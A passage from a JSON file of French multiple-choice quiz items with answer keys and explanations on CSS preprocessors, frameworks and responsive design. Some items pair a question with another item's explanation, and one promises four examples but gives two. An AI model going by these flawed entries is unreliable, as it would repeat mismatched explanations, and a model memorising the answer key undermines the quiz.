            "explanation": "Un préprocesseur CSS est un langage qui étend les fonctionnalités de CSS, permettant d'utiliser des fonctionnalités avancées comme les variables, les mixins, les fonctions et l'imbrication.\n\nCes langages sont compilés en CSS standard avant d'être utilisés dans le navigateur.\n\nVoici deux exemples :\n\t- Sass (Syntactically Awesome Style Sheets) est un préprocesseur qui offre des fonctionnalités avancées pour écrire du CSS de manière plus efficace.\nSCSS (Sassy CSS) est une syntaxe de Sass qui est plus proche du CSS traditionnel, permettant d'utiliser des fonctionnalités supplémentaires tout en conservant la syntaxe CSS.\n\t- LESS est un préprocesseur qui permet également d'utiliser des fonctionnalités avancées comme les variables, les mixins, les fonctions et l'imbrication, rendant le CSS plus dynamique et maintenable."
        },
        {
            "theme": "Le CSS",
            "question": "Qu'est-ce qu'un framework CSS ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un framework CSS est une bibliothèque de styles préconçus qui facilite le développement de sites web en fournissant des composants et des styles réutilisables",
                "Un gestionnaire de base de données",
                "Un langage de programmation orienté objet",
                "Un compilateur"
            ],
            "correct": 0,
            "explanation": "Un framework CSS est une bibliothèque de styles préconçus qui facilite le développement de sites web en fournissant des composants et des styles réutilisables. Ils permettent de gagner du temps et d'assurer la cohérence visuelle.\nVoici quatre exemples :\n\t- Bootstrap est un framework CSS populaire qui fournit des composants et des styles préconçus pour faciliter le développement de sites web responsives, incluant une grille flexible, des boutons, des formulaires et d'autres éléments d'interface utilisateur.\n\t- Tailwind CSS est un framework CSS utilitaire qui permet de créer des designs personnalisés rapidement en utilisant des classes utilitaires.\nContrairement à d'autres, il ne fournit pas de composants préconçus, mais offre une grande flexibilité pour construire des interfaces."
        },
        {
            "theme": "Le CSS",
            "question": "Quelles sont les principales conventions de nommage CSS ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un compilateur",
                "Lorsqu'un projet web prend de l'ampleur et que les fichiers CSS deviennent volumineux, il est souvent recommandé d'adopter une convention de nommage précise pour maintenir la cohérence et la lisibilité du code",
                "Un langage de programmation orienté objet",
                "Un gestionnaire de base de données"
            ],
            "correct": 1,
            "explanation": "Lorsqu'un projet web prend de l'ampleur et que les fichiers CSS deviennent volumineux, il est souvent recommandé d'adopter une convention de nommage précise pour maintenir la cohérence et la lisibilité du code.\nDeux conventions largement utilisées dans l'industrie sont OOCSS (Object Oriented CSS) et BEM ( Block , Element , Modifier ).\n\n<b>OOCSS</b> est une approche qui applique les principes de la programmation orientée objet au CSS.\nElle encourage la création de composants réutilisables et la séparation de la structure et de l'apparence.\n\n<b>BEM</b> , quant à elle, est une méthodologie qui divise l'interface utilisateur en blocs indépendants.\nElle utilise une nomenclature spécifique pour définir les relations entre les éléments, facilitant ainsi la compréhension de la structure du code."
        },
        {
            "theme": "Le CSS",
            "question": "Pourquoi utiliser un framework CSS comme Bootstrap ou Tailwind ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Pour supprimer complètement la nécessité d'écrire du CSS sur le projet",
                "Pour garantir que le site sera automatiquement accessible sans effort",
                "Pour bénéficier de composants et d'utilitaires prêts à l'emploi, d'une grille responsive et de conventions partagées, ce qui accélère le développement et homogénéise l'interface",
                "Parce que le CSS natif ne permet pas de créer des sites responsives"
            ],
            "correct": 2,
            "explanation": "Un framework CSS apporte des gains de productivité et de cohérence :\n- Bootstrap fournit une grille responsive, des composants prêts à l'emploi (navbar, cartes, formulaires) et des styles cohérents, idéal pour prototyper vite ;\n- Tailwind adopte une approche 'utility-first' : des classes utilitaires composables qui offrent un contrôle fin sans quitter le HTML.\nLes limites à connaître : sites au rendu générique si on ne personnalise pas, dépendance à la documentation, CSS potentiellement plus lourd.\nEn entretien, le jury attend un choix justifié par le contexte du projet (délais, équipe, besoin de personnalisation) et non un choix par défaut."
        }
    ],
    "Le responsive design": [
        {
            "theme": "Le responsive design",
            "question": "Qu'est-ce que le responsive design en CSS et comment l'implémenter ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Le responsive design en CSS permet de créer des mises en page adaptables à différentes tailles d'écran",
                "C’est une technique de compression des fichiers CSS pour accélérer le chargement du site",
                "C’est une méthode pour rendre un site compatible uniquement avec les écrans 4K",
                "C’est un framework JavaScript utilisé pour animer les éléments d’un site"
            ],
            "correct": 0,
            "explanation": "Le responsive design en CSS permet de créer des mises en page adaptables à différentes tailles d'écran.\nUtilisez des unités de mesure flexibles (%, em, rem), des media queries et des grilles fluides pour créer des designs réactifs"
        },
        {
            "theme": "Le responsive design",
            "question": "Quelles sont les techniques CSS couramment utilisées pour créer un design responsive ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Utiliser uniquement des tableaux HTML pour structurer la page",
                "Pour créer un design responsive, plusieurs techniques CSS couramment utilisées existent",
                "Employer des images fixes sans redimensionnement",
                "Définir des tailles en pixels pour tous les éléments"
            ],
            "correct": 1,
            "explanation": "Pour créer un design responsive, plusieurs techniques CSS couramment utilisées existent.\n\t- Le CSS Grid Layout ou (grilles CSS) permettent de créer des mises en page complexes et flexibles en définissant des lignes et des colonnes.\nElles offrent un contrôle précis sur l'agencement des éléments, facilitant l'adaptation du contenu à différentes tailles d'écran.\n\t- Le Flexible Box Layout ou (modèle Flexbox) est idéal pour créer des mises en page unidimensionnelles.\nIl permet de distribuer l'espace entre les éléments d'une interface et d'aligner les éléments de manière efficace, même lorsque leur taille est inconnue ou dynamique.\n\t- Les Media Queries sont des règles CSS qui appliquent des styles spécifiques en fonction des caractéristiques du dispositif, telles que la largeur de l'écran, la résolution ou l'orientation. Cela permet d'adapter le design en fonction des différentes tailles d'écran, garantissant ainsi une expérience utilisateur optimale sur tous les appareils.\n\t- Les Unités relatives , comme les pourcentages (%), les unités viewport (vw, vh) et les unités relatives (rem, em) sont recommandées pour garantir que les éléments s'ajustent proportionnellement à la taille de l'écran, offrant ainsi une meilleure adaptabilité.\nEn combinant ces techniques, les développeurs peuvent créer des sites web qui s'adaptent harmonieusement à une variété d'appareils, améliorant ainsi l'expérience utilisateur."
        },
        {
            "theme": "Le responsive design",
            "question": "Quelles sont les principales caractéristiques prises en charge dans les médias queries ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Les médias queries permettent de cibler diverses caractéristiques des appareils",
                "Elles servent à importer des polices externes dans le site",
                "Elles définissent les animations CSS sur mobile",
                "Elles permettent d’activer JavaScript selon la taille d’écran"
            ],
            "correct": 0,
            "explanation": "Les médias queries permettent de cibler diverses caractéristiques des appareils.\nLes plus couramment utilisées sont :\n\t- width et height , qui représentent la largeur et la hauteur de la fenêtre du navigateur,\n\t- min-width et max-width pour la largeur minimale et maximale,\n\t- min-height et max-height pour la hauteur minimale et maximale,\n\t- orientation pour l'orientation de l'appareil (portrait ou paysage).\n\nVoici un exemple d'utilisation : @media (min-width: 768px) and (max-width: 1024px) {\n .container {\n width: 90%;\n }\n}\n\n@media (orientation: landscape) {\n .header {\n height: 50px;\n }\n}"
        },
        {
            "theme": "Le responsive design",
            "question": "Quels sont les différents médias pris en compte par les médias queries ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Uniquement les médias audio et vidéo",
                "Les fichiers CSS compressés uniquement",
                "Les images haute définition pour mobile",
                "Les médias queries peuvent cibler différents types de médias, permettant d'adapter le contenu en fonction du dispositif d'affichage"
            ],
            "correct": 3,
            "explanation": "Les médias queries peuvent cibler différents types de médias, permettant d'adapter le contenu en fonction du dispositif d'affichage.\n\t- all s'applique à tous les types de médias (valeur par défaut),\n\t- print cible les documents imprimés et les aperçus d'impression,\n\t- screen s'applique aux écrans d'ordinateurs, tablettes, smartphones, etc.,\n\t- speech est destiné aux synthétiseurs vocaux.\n\nVoici un exemple d'utilisation :\n@media print {\n body {\n font-size: 12pt;\n color: black;\n }\n}\n\n@media screen and (max-width: 600px) {\n .sidebar {\n display: none;\n }\n}."
        },
        {
            "theme": "Le responsive design",
            "question": "Qu'est-ce qu'un breakpoint en responsive design ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une valeur de contraste appliquée à une image",
                "Un bug CSS qui provoque une coupure de ligne",
                "Un point de débogage dans le code JavaScript",
                "Un breakpoint est une valeur de largeur d'écran définie dans les media queries"
            ],
            "correct": 3,
            "explanation": "Un breakpoint est une valeur de largeur d'écran définie dans les media queries.\nIl détermine à quel moment le design d'une page web doit changer pour s'adapter à une autre taille d'écran.\n\nPar exemple, un breakpoint peut être fixé à 768 pixels pour passer d'une mise en page en colonne unique à une mise en page en colonnes.\nEn utilisant des breakpoints, les développeurs peuvent appliquer des styles CSS spécifiques qui garantissent que le contenu reste lisible et bien structuré.\nCela permet d'offrir une expérience utilisateur optimale sur les smartphones, les tablettes et les ordinateurs de bureau."
        },
        {
            "theme": "Le responsive design",
            "question": "Quels sont les différents breakpoints et les écrans qui leur sont associés ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Ce sont les points GPS d’un site web hébergé",
                "Les breakpoints définissent les marges CSS par défaut",
                "Ce sont des éléments de design présents uniquement sur mobile",
                "Breakpoints avec 6 tailles : - < 576px : Petit smartphone ... 1200px : Ordinateurs de bureau"
            ],
            "correct": 3,
            "explanation": "Breakpoints avec 6 tailles :\n\t- < 576px : Petit smartphone\n\t- < 768px : Grand Smartphone\n\t- < 992px : Petite tablette\n\t- < 1200px : Grande tablette\n\t- < 1400px : Ecran PC standard \n\t- >1400px : Ecran PC large \n\nBreakpoints avec 4 tailles : \n\t- < 750px : Smartphone \n\t- < 970px : Tablette \n\t- < 1170px : Ecran PC standard \n\t- > 1170px : Ecran PC large\n\nLes breakpoints courants incluent :\n\t- 320px : Smartphones en mode portrait\n\t- 480px : Smartphones en mode paysage\n\t- 768px : Tablettes en mode portrait\n\t- 1024px : Tablettes en mode paysage\n\t- 1200px : Ordinateurs de bureau"
        },
        {
            "theme": "Le responsive design",
            "question": "Pourquoi est-il important de définir des breakpoints adaptés ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Parce qu’ils accélèrent le temps de chargement du site uniquement sur desktop",
                "Définir des breakpoints adaptés lors dès le début de la conception du site permet d'assurer que le contenu est lisible et accessible sur tous les appareils",
                "Parce qu’ils permettent de masquer le contenu sur tous les petits écrans",
                "Parce qu’ils réduisent automatiquement la taille des images"
            ],
            "correct": 1,
            "explanation": "Définir des breakpoints adaptés lors dès le début de la conception du site permet d'assurer que le contenu est lisible et accessible sur tous les appareils.\nCela améliore l'expérience utilisateur et réduit le taux de rebond"
        },
        {
            "theme": "Le responsive design",
            "question": "Quelles sont les meilleures pratiques pour choisir des breakpoints efficaces ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Choisir uniquement les tailles des téléviseurs 4K",
                "Utiliser les breakpoints fournis par défaut sans adaptation",
                "Analyser les données d'utilisation, Tester sur différents appareils, Adapté au contenu",
                "Définir un seul breakpoint pour tous les appareils"
            ],
            "correct": 2,
            "explanation": "Pour choisir des breakpoints efficaces, plusieurs pratiques sont à suivre.\n\t- Analyser les données d'utilisation : il s'agit d'examinee les statistiques pour identifier les tailles d'écran les plus courantes parmi vos utilisateurs.\n\t- Tester sur différents appareils : il convient d'effectuer des tests sur une variété d'appareils pour déterminer les points de rupture nécessaires à une expérience utilisateur optimale.\n\t- Adapté au contenu : il est nécessaire d'utiliser des breakpoints fondés sur le contenu plutôt que sur des tailles d'écran fixes.\nCela permet d'adapter le design en fonction de la structure et de la disposition du contenu"
        },
        {
            "theme": "Le responsive design",
            "question": "Comment les media queries sont-elles utilisées pour gérer le responsive design ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Les media queries sont des règles CSS qui appliquent des styles spécifiques en fonction des caractéristiques de l'appareil, comme la largeur de l'écran",
                "Elles servent à changer la couleur du texte uniquement sur mobile",
                "Elles permettent de modifier les scripts PHP selon la taille d’écran",
                "Elles ajustent les transitions CSS pour les navigateurs anciens"
            ],
            "correct": 0,
            "explanation": "Les media queries sont des règles CSS qui appliquent des styles spécifiques en fonction des caractéristiques de l'appareil, comme la largeur de l'écran"
        },
        {
            "theme": "Le responsive design",
            "question": "Comment tester l'affichage d'un site web sur différents appareils et tailles d'écran ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Pour tester l'affichage d'un site web sur différents appareils et tailles d'écran, vous pouvez utiliser plusieurs méthodes",
                "En changeant manuellement la taille du fichier CSS",
                "En réinstallant le navigateur à chaque test",
                "En désactivant le JavaScript du site"
            ],
            "correct": 0,
            "explanation": "Les media queries sont des règles CSS qui appliquent des styles spécifiques en fonction des caractéristiques de l'appareil, comme la largeur de l'écran.\nElles permettent de modifier la mise en page et le style en fonction des breakpoints définis."
        },
        {
            "theme": "Le responsive design",
            "question": "Comment le responsive design améliore-t-il l'expérience utilisateur ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "En augmentant la taille de toutes les images",
                "En supprimant le contenu sur les petits écrans",
                "En forçant le zoom automatique du navigateur",
                "Le responsive design améliore l'expérience utilisateur en garantissant que le contenu est accessible et facile à naviguer sur tous les appareils"
            ],
            "correct": 3,
            "explanation": "Pour tester l'affichage d'un site web sur différents appareils et tailles d'écran, vous pouvez utiliser plusieurs méthodes.\nTout d'abord, les outils de développement intégrés dans les navigateurs, comme ceux de Chrome ou Firefox , permettent de simuler différentes tailles d'écran et de tester la réactivité du design.\n\nEnsuite, des services en ligne tels que BrowserStack et Responsinator offrent des environnements de test variés, vous permettant de visualiser votre site sur une large gamme d'appareils.\nEnfin, il est recommandé de tester physiquement votre site sur une sélection d'appareils réels pour vérifier le rendu final et l'expérience utilisateur.\nCes outils et méthodes facilitent l'évaluation de l'accessibilité et de la fonctionnalité de votre site sur différents dispositifs, garantissant ainsi une expérience utilisateur optimale pour tous."
        },
        {
            "theme": "Le responsive design",
            "question": "Qu'est-ce que le responsive design en CSS et comment l'implémenter ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Le responsive design en CSS permet de créer des mises en page adaptables à différentes tailles d'écran à l'aide des media queries",
                "C’est une méthode consistant à utiliser uniquement des unités fixes pour contrôler les largeurs des éléments",
                "C’est une technique qui consiste à créer plusieurs versions d’un même site pour chaque appareil",
                "C’est une approche qui repose sur l'utilisation de JavaScript pour redimensionner les blocs dynamiquement"
            ],
            "correct": 0,
            "explanation": "Le responsive design consiste à adapter la mise en page d’un site à la taille de l’écran en utilisant notamment les media queries."
        },
        {
            "theme": "Le responsive design",
            "question": "Quelles sont les techniques CSS couramment utilisées pour créer un design responsive ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "L’utilisation de media queries, d’unités relatives (%, em, rem, vw, vh) et de grilles flexibles comme Flexbox ou CSS Grid",
                "L’emploi exclusif de tableaux HTML pour organiser la mise en page",
                "Le redimensionnement manuel des éléments via JavaScript à chaque chargement de page",
                "L’utilisation de feuilles de style séparées pour chaque appareil sans media queries"
            ],
            "correct": 0,
            "explanation": "Les techniques CSS les plus courantes incluent l’usage de media queries, de Flexbox, de Grid et d’unités relatives."
        },
        {
            "theme": "Le responsive design",
            "question": "Quelles sont les principales caractéristiques prises en charge dans les media queries ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "La largeur, la hauteur, l’orientation de l’écran et la résolution",
                "Le type de police et la couleur principale du site",
                "La vitesse de connexion Internet de l’utilisateur",
                "Le nombre de clics sur la page"
            ],
            "correct": 0,
            "explanation": "Les media queries permettent de cibler des caractéristiques telles que la largeur, la hauteur, l’orientation ou la résolution d’écran."
        },
        {
            "theme": "Le responsive design",
            "question": "Quels sont les différents médias pris en compte par les media queries ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Les médias screen, print, speech, et all",
                "Uniquement les médias vidéo et audio",
                "Les fichiers JSON et XML utilisés par les API",
                "Les feuilles de style importées dynamiquement via JavaScript"
            ],
            "correct": 0,
            "explanation": "Les media queries peuvent cibler différents types de médias, comme screen (écran), print (impression) ou speech (lecture vocale)."
        },
        {
            "theme": "Le responsive design",
            "question": "Qu'est-ce qu'un breakpoint en responsive design ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une valeur de largeur d’écran où la mise en page s’ajuste pour améliorer l’affichage",
                "Un effet d’animation qui s’active lors du redimensionnement de la fenêtre",
                "Une fonction JavaScript déclenchée à chaque changement d’orientation d’écran",
                "Un point de sauvegarde du code CSS avant déploiement"
            ],
            "correct": 0,
            "explanation": "Un breakpoint est une largeur d’écran à partir de laquelle la mise en page change via les media queries."
        },
        {
            "theme": "Le responsive design",
            "question": "Quels sont les différents breakpoints et les écrans qui leur sont associés ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Moins de 576px : smartphone, 768px : tablette, 992px : petit écran, 1200px : grand écran",
                "600px : montres connectées, 700px : TV, 2000px : cinéma numérique",
                "576px : micro-écran, 800px : console de jeu, 1800px : projecteur",
                "256px : smartwatch, 512px : tablette, 1024px : télévision"
            ],
            "correct": 0,
            "explanation": "Les breakpoints les plus utilisés sont :\n<576px pour les mobiles, 768px pour les tablettes, 992px pour les ordinateurs, et 1200px pour les grands écrans."
        },
        {
            "theme": "Le responsive design",
            "question": "Pourquoi est-il important de définir des breakpoints adaptés ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Parce qu’ils assurent une lisibilité et une navigation optimales sur tous les appareils",
                "Parce qu’ils accélèrent le rendu CSS sur les navigateurs récents",
                "Parce qu’ils empêchent le site de se déformer lors d’un zoom",
                "Parce qu’ils limitent le nombre de fichiers CSS nécessaires"
            ],
            "correct": 0,
            "explanation": "Des breakpoints bien choisis garantissent une lecture fluide et une mise en page adaptée à chaque appareil."
        },
        {
            "theme": "Le responsive design",
            "question": "Quelles sont les meilleures pratiques pour choisir des breakpoints efficaces ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Basés sur le contenu et non uniquement sur les tailles d’appareils standard",
                "Définis uniquement selon les tailles d’écran des téléviseurs 4K",
                "Fixés aléatoirement pour tester la réactivité du site",
                "Déterminés à partir des préférences de couleur du navigateur"
            ],
            "correct": 0,
            "explanation": "Les breakpoints doivent être définis selon le comportement du contenu et non en fonction de tailles d’appareils figées."
        },
        {
            "theme": "Le responsive design",
            "question": "Comment les media queries sont-elles utilisées pour gérer le responsive design ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Elles appliquent des règles CSS spécifiques selon les caractéristiques de l’appareil, comme la largeur ou l’orientation de l’écran",
                "Elles servent uniquement à importer des fichiers CSS externes",
                "Elles permettent de masquer le JavaScript sur mobile",
                "Elles remplacent automatiquement les images selon le type d’appareil"
            ],
            "correct": 0,
            "explanation": "Les media queries appliquent des styles adaptés selon les caractéristiques du terminal utilisé."
        },
        {
            "theme": "Le responsive design",
            "question": "Comment tester l'affichage d'un site web sur différents appareils et tailles d'écran ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "En utilisant les outils de développement des navigateurs, des émulateurs ou des tests sur appareils physiques",
                "En modifiant directement les fichiers HTML sans actualiser la page",
                "En redimensionnant le navigateur sans utiliser d’outils",
                "En réécrivant les media queries à chaque test"
            ],
            "correct": 0,
            "explanation": "Les outils de développement (comme ceux de Chrome ou Firefox) permettent de simuler différents appareils et résolutions."
        },
        {
            "theme": "Le responsive design",
            "question": "Comment le responsive design améliore-t-il l'expérience utilisateur ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "En rendant le contenu lisible, navigable et cohérent sur tout type d’appareil",
                "En augmentant la densité de texte sur les petits écrans",
                "En masquant automatiquement les sections non pertinentes",
                "En forçant l’affichage horizontal sur tous les supports"
            ],
            "correct": 0,
            "explanation": "Le responsive design garantit une expérience fluide et accessible quel que soit le support utilisé."
        },
        {
            "theme": "Le responsive design",
            "question": "Qu'est-ce que l'UX et l'UI et quelles sont les différences ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "L'UX et l'UI sont deux frameworks CSS utilisés pour gérer le responsive design d'un site web",
                "L'UX (User Experience) et l'UI (User Interface) sont deux aspects complémentaires du design numérique, mais ils ont des objectifs différents",
                "L'UX se limite à la création graphique tandis que l'UI concerne uniquement le développement du code HTML et CSS",
                "L'UI concerne l’expérience de navigation de l’utilisateur, tandis que l’UX concerne uniquement le choix des couleurs et des polices"
            ],
            "correct": 1,
            "explanation": "L'UX (User Experience) et l'UI (User Interface) sont deux aspects complémentaires du design numérique.\nL'UX se concentre sur la facilité d'utilisation, la fluidité de la navigation et la satisfaction globale de l'utilisateur, tandis que l'UI concerne la conception visuelle, les éléments graphiques et l'interaction visuelle. En somme, l'UI façonne l'apparence du produit, tandis que l'UX en définit la qualité d'expérience."
        },
        {
            "theme": "Le responsive design",
            "question": "Quel est l’objectif principal du responsive design ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Permettre à un site web de s’afficher correctement sur tous les types d’appareils, quelle que soit leur taille d’écran",
                "Augmenter la vitesse de chargement du site en réduisant le poids des images",
                "Créer des versions différentes du site pour chaque appareil",
                "Utiliser uniquement des unités fixes comme les pixels pour garantir une mise en page cohérente"
            ],
            "correct": 0,
            "explanation": "Le responsive design a pour objectif principal de garantir qu’un site web s’adapte automatiquement à la taille et à la résolution de l’écran de l’utilisateur, qu’il s’agisse d’un smartphone, d’une tablette ou d’un ordinateur. Cela améliore la lisibilité et la navigation."
        },
        {
            "theme": "Le responsive design",
            "question": "Quelle unité est la plus recommandée pour créer des mises en page adaptatives ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Les unités relatives comme %, em, rem, vw, vh",
                "Les pixels fixes (px) uniquement",
                "Les centimètres (cm)",
                "Les points (pt) utilisés en impression"
            ],
            "correct": 0,
            "explanation": "Les unités relatives comme %, em, rem, vw et vh permettent de créer des mises en page flexibles qui s’adaptent à la taille de l’écran. Elles sont préférées aux unités fixes pour le responsive design."
        },
        {
            "theme": "Le responsive design",
            "question": "Quel attribut HTML permet d’adapter une page web à la taille de l’écran d’un appareil mobile ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "L’attribut charset",
                "La balise meta viewport avec l’attribut content=\"width=device-width, initial-scale=1.0\"",
                "L’attribut responsive=\"true\" sur la balise body",
                "L’attribut mobile-scale dans la balise head"
            ],
            "correct": 1,
            "explanation": "La balise meta viewport permet de contrôler la mise à l’échelle et les dimensions d’une page sur les appareils mobiles.\n\nPar exemple :\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
        },
        {
            "theme": "Le responsive design",
            "question": "Quelle propriété CSS permet de définir la flexibilité d’un élément dans un conteneur flexbox ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "display: inline-block;",
                "flex: 1;",
                "float: left;",
                "position: relative;"
            ],
            "correct": 1,
            "explanation": "La propriété flex: 1; définit la flexibilité d’un élément dans un conteneur flexbox.\nElle indique que l’élément peut grandir pour occuper l’espace disponible dans le conteneur."
        },
        {
            "theme": "Le responsive design",
            "question": "Quelle est la différence entre 'max-width' et 'min-width' dans une media query ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "max-width s’applique lorsque la largeur de l’écran est supérieure à une valeur donnée",
                "min-width s’applique pour les écrans plus petits que la valeur donnée",
                "max-width s’applique lorsque la largeur de l’écran est inférieure à une valeur donnée, tandis que min-width s’applique lorsqu’elle est supérieure",
                "Elles sont équivalentes et peuvent être utilisées indifféremment"
            ],
            "correct": 2,
            "explanation": "max-width s’applique lorsque la largeur de l’écran est inférieure à une valeur donnée, tandis que min-width s’applique lorsqu’elle est supérieure.\nElles permettent de cibler différents types d’appareils pour appliquer des styles adaptés."
        },
        {
            "theme": "Le responsive design",
            "question": "Pourquoi utiliser des images adaptatives dans le responsive design ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Pour charger automatiquement les images dans tous les formats possibles",
                "Pour éviter d’utiliser des images sur mobile",
                "Pour que les images s’adaptent à la taille de l’écran et se chargent plus rapidement sur les petits appareils",
                "Pour changer les couleurs des images selon l’appareil"
            ],
            "correct": 2,
            "explanation": "Les images adaptatives permettent de charger des versions plus légères ou plus grandes selon la taille de l’écran, améliorant ainsi la performance et l’expérience utilisateur."
        },
        {
            "theme": "Le responsive design",
            "question": "Quel framework est le plus connu pour créer des sites web responsives ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Bootstrap",
                "jQuery",
                "Laravel",
                "React Native"
            ],
            "correct": 0,
            "explanation": "Bootstrap est un framework CSS très populaire qui permet de créer rapidement des sites web responsives grâce à son système de grilles, ses composants et ses classes utilitaires."
        },
        {
            "theme": "Le responsive design",
            "question": "Quel avantage principal offre l’utilisation de Flexbox pour le responsive design ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Il permet de créer des mises en page dynamiques et alignées automatiquement, sans avoir recours au float",
                "Il permet d’animer les éléments HTML",
                "Il réduit la taille du code JavaScript nécessaire au design",
                "Il force les éléments à s’aligner uniquement verticalement"
            ],
            "correct": 0,
            "explanation": "Flexbox simplifie la création de mises en page adaptatives en facilitant l’alignement et la distribution de l’espace entre les éléments d’un conteneur, sans devoir gérer les flottants."
        },
        {
            "theme": "Le responsive design",
            "question": "Quel est le principal inconvénient du responsive design mal implémenté ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Une perte de visibilité sur les moteurs de recherche",
                "Des problèmes d’affichage et de lisibilité sur certains appareils",
                "Un temps de chargement réduit",
                "Une compatibilité accrue entre les navigateurs"
            ],
            "correct": 1,
            "explanation": "Un responsive design mal implémenté peut rendre la lecture difficile, provoquer des chevauchements d’éléments ou forcer l’utilisateur à zoomer.\nCela dégrade l’expérience utilisateur."
        },
        {
            "theme": "Le responsive design",
            "question": "Quelle est la différence entre le responsive design et le design adaptatif ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Le responsive design utilise des grilles flexibles et s’adapte automatiquement à toutes les tailles d’écran, tandis que le design adaptatif repose sur des mises en page fixes prédéfinies pour certaines résolutions",
                "Le design adaptatif est une version plus récente du responsive design utilisant uniquement JavaScript",
                "Le responsive design s’utilise uniquement pour les sites mobiles, tandis que l’adaptatif est réservé aux ordinateurs",
                "Il n’existe aucune différence, ce sont deux termes synonymes"
            ],
            "correct": 0,
            "explanation": "Le responsive design repose sur des grilles et unités flexibles, ce qui permet une adaptation fluide à toute taille d’écran.\nLe design adaptatif, quant à lui, utilise plusieurs mises en page fixes pour différentes résolutions spécifiques.\nLe premier est fluide, le second est par paliers."
        },
        {
            "theme": "Le responsive design",
            "question": "Pourquoi utiliser la technique du 'mobile first' dans le responsive design ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Parce que la majorité des utilisateurs naviguent d'abord sur mobile, et cela permet d'optimiser les performances et la hiérarchisation du contenu",
                "Parce que le développement mobile est plus simple que le développement desktop",
                "Parce que les frameworks CSS imposent de commencer par le mobile",
                "Parce que les navigateurs mobiles ne supportent pas les media queries inversées"
            ],
            "correct": 0,
            "explanation": "La philosophie 'mobile first' consiste à concevoir d'abord la version mobile d’un site, puis à l’enrichir progressivement pour les écrans plus grands.\nCela garantit une meilleure performance, une hiérarchisation claire du contenu et une compatibilité optimale sur les petits écrans."
        },
        {
            "theme": "Le responsive design",
            "question": "Quelle est la meilleure pratique pour gérer les typographies en responsive design ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Utiliser des unités relatives comme 'em', 'rem' ou 'vw' au lieu de pixels fixes pour une mise à l’échelle fluide",
                "Utiliser exclusivement la taille de police en pixels pour garder la cohérence visuelle",
                "Créer une feuille de style CSS distincte pour chaque taille d’écran",
                "Limiter l’utilisation de polices aux systèmes d’exploitation mobiles uniquement"
            ],
            "correct": 0,
            "explanation": "Les unités relatives comme 'em', 'rem', ou 'vw' permettent d’adapter la taille du texte proportionnellement à la taille de l’écran ou à la police racine.\nCela améliore la lisibilité et l’adaptabilité du site."
        },
        {
            "theme": "Le responsive design",
            "question": "Quel rôle jouent les breakpoints dans le responsive design ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Les breakpoints définissent les points de rupture où la mise en page doit s’adapter à une nouvelle taille d’écran",
                "Les breakpoints servent à limiter la vitesse d’un site web sur mobile",
                "Les breakpoints sont des balises HTML spécifiques utilisées pour détecter les appareils",
                "Les breakpoints permettent de forcer la rotation d’écran sur les appareils mobiles"
            ],
            "correct": 0,
            "explanation": "Les breakpoints sont des seuils de largeur d’écran définis dans les media queries.\nLorsqu’un écran franchit un de ces seuils, la mise en page s’ajuste pour rester lisible et fonctionnelle."
        },
        {
            "theme": "Le responsive design",
            "question": "Comment optimiser les performances d’un site responsive ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "En réduisant le nombre de requêtes HTTP, en compressant les images, et en chargeant les ressources adaptées selon le périphérique",
                "En désactivant le cache du navigateur",
                "En augmentant la résolution des images pour tous les écrans",
                "En forçant les scripts JavaScript à s’exécuter en priorité"
            ],
            "correct": 0,
            "explanation": "Un site responsive performant limite les ressources lourdes et adapte le contenu selon l’appareil (images, vidéos, polices).\nLe lazy loading et la compression sont des techniques efficaces pour améliorer la vitesse de chargement."
        },
        {
            "theme": "Le responsive design",
            "question": "Quelle différence existe entre les propriétés CSS 'flexbox' et 'grid' ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Flexbox est idéal pour aligner des éléments sur un axe (ligne ou colonne), tandis que Grid gère des mises en page bidimensionnelles avec lignes et colonnes",
                "Grid est obsolète et a été remplacé par Flexbox",
                "Flexbox ne fonctionne que pour les images, Grid pour les textes",
